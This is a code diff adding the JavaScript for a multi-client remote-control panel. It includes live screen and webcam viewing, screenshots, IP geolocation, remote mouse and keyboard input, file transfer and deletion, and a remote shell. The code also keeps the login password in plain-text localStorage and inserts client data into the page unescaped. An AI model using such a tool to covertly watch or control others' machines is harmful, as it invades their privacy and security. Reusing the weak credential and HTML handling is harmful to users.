+        APP.socket.on('clipboard_status', data => { showToast(data.success ? 'Set!' : 'Failed: ' + data.error, data.success ? 'success' : 'error'); });
+
+        // Audio
+        APP.socket.on('audio_volume', data => {
+            if (data && data.volume !== undefined) {
+                document.getElementById('volume-slider').value = data.volume;
+                document.getElementById('volume-label').textContent = data.volume + '%';
+                document.getElementById('mute-btn').textContent = data.muted ? '🔇 Unmute' : '🔊 Mute';
+            }
+        });
+
+        // File list
+        APP.socket.on('file_list_result', data => {
+            if (data.error) { showToast(data.error, 'error'); return; }
+            APP.currentFilePath = data.path;
+            document.getElementById('files-breadcrumb').textContent = data.path;
+            renderFileTable(data.items, data.parent);
+        });
+        APP.socket.on('file_delete_result', data => { showToast(data.success ? 'Deleted' : 'Error: ' + data.message, data.success ? 'success' : 'error'); fileRefresh(); });
+        APP.socket.on('file_new_folder_result', data => { showToast(data.success ? 'Created' : 'Error', data.success ? 'success' : 'error'); fileRefresh(); });
+        APP.socket.on('file_upload_result', data => { showToast(data.success ? 'Uploaded' : 'Error', data.success ? 'success' : 'error'); fileRefresh(); });
+
+        // Webcam frames
+        APP.socket.on('webcam_frame', data => {
+            if (APP.currentPanel !== 'webcam-panel') return;
+            const img = document.getElementById('webcam-image');
+            img.src = 'data:image/jpeg;base64,' + data.image;
+            img.style.display = 'block';
+            document.getElementById('webcam-placeholder').style.display = 'none';
+        });
+        APP.socket.on('webcam_status', data => {
+            APP.webcamActive = data.active;
+            const b = document.getElementById('webcam-toggle-btn');
+            b.textContent = data.active ? '⏸ Stop Webcam' : '▶ Start Webcam';
+            b.classList.toggle('active-stream', data.active);
+        });
+
+        // Fun command results
+        APP.socket.on('cmd_result', data => {
+            showToast(`${data.cmd}: ${data.message}`, data.ok ? 'success' : 'error');
+        });
+        APP.socket.on('screenshot_result', data => {
+            if (data.error) { showToast(data.error, 'error'); return; }
+            const p = document.getElementById('ss-preview');
+            p.innerHTML = `<img src="data:image/${data.format};base64,${data.data}" style="max-width:100%;cursor:pointer;" onclick="window.open(this.src)">`;
+            showToast('Screenshot taken', 'success');
+        });
+        APP.socket.on('geoip_result', data => {
+            if (data.error) { showToast(data.error, 'error'); return; }
+            const d = document.getElementById('geo-result');
+            d.innerHTML = data.country ? `📍 ${data.city || ''}, ${data.regionName || ''}, ${data.country}<br>🌐 ${data.query}<br>🏢 ${data.isp || ''}` : JSON.stringify(data);
+        });
+        APP.socket.on('apps_result', data => {
+            const d = document.getElementById('apps-result');
+            d.innerHTML = (data.apps || []).slice(0, 100).join('<br>') || 'No apps found';
+        });
+        APP.socket.on('search_result', data => {
+            const d = document.getElementById('sr-result');
+            d.innerHTML = ((data.results || []).length ? data.results.join('<br>') : 'No results') + `<br><small>${data.results?.length || 0} found</small>`;
+        });
+        APP.socket.on('execute_result', data => {
+            const d = document.getElementById('sh-out');
+            d.textContent = data.output || '(empty)';
+            if (data.code !== 0) d.textContent += `\n[exit code: ${data.code}]`;
+        });
+
+        // Download chunks (for large files)
+        APP.socket.on('file_download_chunk', data => {
+            if (data.error) { showToast(data.error, 'error'); return; }
+            // Download via Blob
+            if (!APP._downloadBuffer) APP._downloadBuffer = [];
+            APP._downloadBuffer.push(data.data);
+            if (data.eof) {
+                const b64 = APP._downloadBuffer.join('');
+                APP._downloadBuffer = null;
+                const a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,' + b64;
+                a.download = data.path.split(/[\\/]/).pop();
+                document.body.appendChild(a); a.click(); document.body.removeChild(a);
+                showToast('Download complete', 'success');
+            }
+        });
+    }
+
+    function updateConnectionStatus(connected, text) {
+        const dot = document.getElementById('connection-dot');
+        const label = document.getElementById('connection-text');
+        dot.style.background = connected ? 'var(--accent-green)' : 'var(--accent-red)';
+        label.textContent = text || (connected ? 'Connected' : 'Offline');
+        label.style.color = connected ? 'var(--accent-green)' : 'var(--accent-red)';
+    }
+
+    // ─── Login ─────────────────────────────────────────────────────
+    function doLogin() {
+        const u = document.getElementById('login-username').value.trim();
+        const p = document.getElementById('login-password').value.trim();
+        if (!u || !p) { document.getElementById('login-error').textContent = 'Enter credentials'; return; }
+        localStorage.setItem('rasphere_auth', JSON.stringify({username: u, password: p}));
+        APP.socket.emit('login', {username: u, password: p});
+    }
+    document.getElementById('login-password').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
+    document.getElementById('login-username').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('login-password').focus(); });
+
+    function logout() {
+        APP.authenticated = false; APP.streaming = false; APP.terminalActive = false;
+        localStorage.removeItem('rasphere_auth');
+        APP.socket.disconnect(); APP.socket.connect();
+        document.getElementById('login-overlay').classList.remove('hidden');
+        document.getElementById('screen-image').style.display = 'none';
+        document.getElementById('screen-placeholder').style.display = '';
+    }
+
+    function killSwitch() {
+        if (confirm('⚠️ DISCONNECT ALL CLIENTS?\n\nThis will close all connections.')) {
+            emitToClient('kill_switch', {});
+            showToast('Kill signal sent', 'error');
+        }
+    }
+
+    // ─── Client Selection ───────────────────────────────────────────
+    function updateClientSelector() {
+        const sel = document.getElementById('client-selector');
+        const ids = Object.keys(APP.clients);
+        sel.innerHTML = ids.length ? ids.map(id => {
+            const c = APP.clients[id];
+            return `<option value="${id}" ${APP.selectedClient === id ? 'selected' : ''}>${c.hostname} (${c.platform})</option>`;
+        }).join('') : '<option value="">-- No clients --</option>';
+        document.getElementById('no-clients-msg').style.display = ids.length ? 'none' : '';
+        if (!ids.length) APP.selectedClient = null;
+    }
+
+    function selectClient(id) {
+        APP.selectedClient = id || null;
+        if (id) {
+            APP.socket.emit('select_client', {client_id: id});
+            emitToClient('start_system_monitor');
+            showToast(`Controlling: ${APP.clients[id]?.hostname || id}`, 'info');
+        }
+    }
+
+    async function refreshClientList() {
+        try {
+            const r = await fetch('/api/clients', {credentials: 'same-origin'});
+            const data = await r.json();
+            data.clients.forEach(c => { APP.clients[c.id] = c; });
+            updateClientSelector();
+        } catch(e) {}
+    }
+
+    // ─── Emit to Client ─────────────────────────────────────────────
+    function emitToClient(event, data) {
+        if (!APP.selectedClient) { showToast('Select a client first', 'error'); return; }
+        APP.socket.emit(event, data || {});
+    }
+
+    // ─── Sidebar ────────────────────────────────────────────────────
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('collapsed');
+        document.getElementById('main-content').classList.toggle('expanded');
+    }
+    function switchPanel(panelId, navItem) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        document.getElementById(panelId).classList.add('active');
+        if (navItem) navItem.classList.add('active');
+        APP.currentPanel = panelId;
+        if (panelId === 'stats-panel') emitToClient('start_system_monitor');
+        else emitToClient('stop_system_monitor');
+        if (panelId === 'files-panel' && !APP.currentFilePath) fileRefresh();
+    }
+
+    // ─── Webcam ────────────────────────────────────────────────────
+    APP.webcamActive = false;
+    function toggleWebcam() {
+        if (APP.webcamActive) {
+            emitToClient('stop_webcam');
+        } else {
+            emitToClient('start_webcam');
+        }
+    }
+
+    // ─── Screen ─────────────────────────────────────────────────────
+    function toggleScreenStream() {
+        if (APP.streaming) { emitToClient('stop_screen_capture'); }
+        else { emitToClient('start_screen_capture', {monitor: 1}); APP.lastFrameTime = performance.now(); APP.frameCount = 0; APP.fpsHistory = []; }
+    }
+    function updateStreamButton() {
+        const b = document.getElementById('stream-toggle-btn');
+        b.textContent = APP.streaming ? '⏸ Stop Stream' : '▶ Start Stream';
+        b.classList.toggle('active-stream', APP.streaming);
+    }
+    function setQuality() { emitToClient('set_screen_quality', {quality: parseInt(document.getElementById('quality-select').value)}); }
+    function setScale() { emitToClient('set_screen_quality', {scale: parseFloat(document.getElementById('scale-select').value)}); }
+    function toggleCursorTracking() {
+        APP.cursorTracking = !APP.cursorTracking;
+        const b = document.getElementById('track-btn');
+        b.textContent = APP.cursorTracking ? '👆 Track On' : '👆 Track Off';
+        b.style.background = APP.cursorTracking ? 'var(--accent-blue)' : '';
+        b.style.color = APP.cursorTracking ? '#fff' : '';
+    }
+    function sendShortcut(name) { emitToClient('keyboard_event', {action: 'shortcut', name}); }
+
+    // Mouse events on screen
+    const screenContainer = document.getElementById('screen-container');
+    const screenImage = document.getElementById('screen-image');
+    function getCoords(e) { const r = screenImage.getBoundingClientRect(); return {x: (e.clientX - r.left) / r.width, y: (e.clientY - r.top) / r.height}; }
+    screenContainer.addEventListener('click', e => {
+        if (!APP.streaming) return;
+        const c = getCoords(e);
+        if (c.x >= 0 && c.x <= 1 && c.y >= 0 && c.y <= 1) {
+            emitToClient('mouse_event', {action: 'move', x: c.x, y: c.y});
+            emitToClient('mouse_event', {action: 'click', button: e.shiftKey ? 'right' : 'left'});
+        }
+    });
+    screenContainer.addEventListener('contextmenu', e => {
+        e.preventDefault();
+        if (!APP.streaming) return;
+        const c = getCoords(e);
+        if (c.x >= 0 && c.x <= 1 && c.y >= 0 && c.y <= 1) {
+            emitToClient('mouse_event', {action: 'move', x: c.x, y: c.y});
+            emitToClient('mouse_event', {action: 'click', button: 'right'});
+        }
+    });
+    screenContainer.addEventListener('wheel', e => {
+        if (!APP.streaming) return;
+        e.preventDefault();
+        emitToClient('mouse_event', {action: 'scroll', dx: 0, dy: Math.sign(e.deltaY)});
+    }, {passive: false});
+    screenContainer.addEventListener('mousemove', e => {
+        if (!APP.streaming) return;
+        if (!APP.cursorTracking && !e.buttons) return;
+        const c = getCoords(e);
+        if (c.x >= 0 && c.x <= 1 && c.y >= 0 && c.y <= 1)
+            emitToClient('mouse_event', {action: 'move', x: c.x, y: c.y});
+    });
+    screenContainer.addEventListener('dblclick', e => {
+        if (!APP.streaming) return;
+        const c = getCoords(e);
+        if (c.x >= 0 && c.x <= 1 && c.y >= 0 && c.y <= 1) {
+            emitToClient('mouse_event', {action: 'move', x: c.x, y: c.y});
+            emitToClient('mouse_event', {action: 'click', button: 'left', double: true});
+        }
+    });
+
+    // Keyboard passthrough
+    document.addEventListener('keydown', e => {
+        if (!APP.streaming || APP.currentPanel !== 'screen-panel') return;
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+        if (e.ctrlKey && e.altKey && e.key === 'Delete') { e.preventDefault(); emitToClient('keyboard_event', {action: 'shortcut', name: 'ctrl_alt_del'}); return; }
+        if (e.key === 'F5') { e.preventDefault(); return; }
+        emitToClient('keyboard_event', {action: 'type', text: e.key});
+    });
+
+    // ─── Files ──────────────────────────────────────────────────────
+    function fileNavigate(path) { emitToClient('file_list', {path}); }
+    function fileNavigateUp() { fileRefresh(); }
+    function fileRefresh() { emitToClient('file_list', {path: APP.currentFilePath || ''}); }
+    function renderFileTable(items, parent) {
+        const c = document.getElementById('files-table');
+        let h = '<table><thead><tr><th>Name</th><th style="width:100px;">Size</th><th style="width:180px;">Modified</th></tr></thead><tbody>';
+        if (parent) h += `<tr class="file-row" data-action="navigate" data-path="${esc(parent)}"><td>📁 <strong>..</strong></td><td></td><td></td></tr>`;
+        for (const item of items) {
+            const icon = item.type === 'directory' ? '📁' : item.type === 'drive' ? '💾' : '📄';
+            const action = (item.type === 'directory' || item.type === 'drive') ? 'navigate' : 'download';
+            h += `<tr class="file-row" data-action="${action}" data-path="${esc(item.path)}" data-name="${esc(item.name)}">
+                <td>${icon} ${escHtml(item.name)}${item.inaccessible ? ' 🔒' : ''}</td>
+                <td class="file-size">${item.type === 'directory' ? '' : fmtSize(item.size)}</td>
+                <td class="file-date">${item.modified ? new Date(item.modified).toLocaleString() : ''}</td></tr>`;
+        }
+        h += '</tbody></table>';
+        c.innerHTML = h;
+        c.querySelectorAll('.file-row').forEach(row => {
+            row.addEventListener('click', function() {
+                const a = this.dataset.action, p = this.dataset.path;
+                if (a === 'navigate') emitToClient('file_list', {path: p});
+                else if (a === 'download') emitToClient('file_download_request', {path: p});
+            });
+            row.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                if (confirm(`Delete "${this.dataset.name}"?`))
+                    emitToClient('file_delete', {path: this.dataset.path});
+            });
+        });
+    }
+    function fmtSize(b) { if (!b) return '0 B'; const u = ['B','KB','MB','GB','TB']; const i = Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+u[i]; }
+    function fileNewFolder() { const n = prompt('Name:', 'New Folder'); if (n) emitToClient('file_new_folder', {parent: APP.currentFilePath, name: n}); }
+    function fileUpload(input) {
+        const file = input.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = function() {
+            const b64 = reader.result.split(',')[1];
+            emitToClient('file_upload_chunk', {path: (APP.currentFilePath || '') + '/' + file.name, data: b64, offset: 0});
+        };
+        reader.readAsDataURL(file);
+        input.value = '';
+    }
+
+    // ─── Terminal ──────────────────────────────────────────────────
+    function toggleTerminal() { APP.terminalActive ? emitToClient('terminal_stop') : emitToClient('terminal_start'); }
+    function updateTerminalButton() {
+        const b = document.getElementById('terminal-toggle-btn');
+        b.textContent = APP.terminalActive ? '⏸ Stop' : '▶ Start';
+        b.classList.toggle('active-stream', APP.terminalActive);
+        if (APP.terminalActive) document.getElementById('terminal-input').focus();
+    }
+    function terminalKeydown(e) {
+        if (e.key === 'Enter') {
+            const cmd = document.getElementById('terminal-input').value;
+            if (cmd && APP.terminalActive) {
+                emitToClient('terminal_input', {command: cmd});
+                const o = document.getElementById('terminal-output');
+                const ph = o.querySelector('.terminal-placeholder'); if (ph) ph.remove();
+                o.innerHTML += `<span style="color:var(--accent-cyan);">$ ${escHtml(cmd)}</span>\n`;
+                o.scrollTop = o.scrollHeight;
+            }
+            document.getElementById('terminal-input').value = '';
+        }
+    }
+    function clearTerminal() { document.getElementById('terminal-output').innerHTML = ''; }
+
+    // ─── Clipboard ─────────────────────────────────────────────────
+    function clipboardGet() { emitToClient('clipboard_get'); }
+    function clipboardSet() { const t = document.getElementById('clipboard-textarea').value; if (t) emitToClient('clipboard_set', {text: t}); }
+
+    // ─── Audio ─────────────────────────────────────────────────────
+    function audioToggleMute() { emitToClient('audio_toggle_mute'); }
+    function audioSetVolume(l) { document.getElementById('volume-label').textContent = l + '%'; emitToClient('audio_set_volume', {level: parseInt(l)}); }
+
+    // ─── Utils ─────────────────────────────────────────────────────
+    function escHtml(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+    function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/'/g,'&#39;'); }
+    function showToast(msg, type) {
+        const c = document.getElementById('toast-container');
+        const t = document.createElement('div');
+        t.className = `toast ${type || 'info'}`; t.textContent = msg;
+        c.appendChild(t);
+        setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 3000);
+    }
+
+    function init() {
+        initSocket();
+        const saved = localStorage.getItem('rasphere_auth');
+        if (saved) {
+            const creds = JSON.parse(saved);
+            document.getElementById('login-username').value = creds.username || '';
+            document.getElementById('login-password').value = creds.password || '';
+        }
+        setInterval(refreshClientList, 10000);
+    }
+    document.addEventListener('DOMContentLoaded', init);
+</script>
+</body>
+</html>
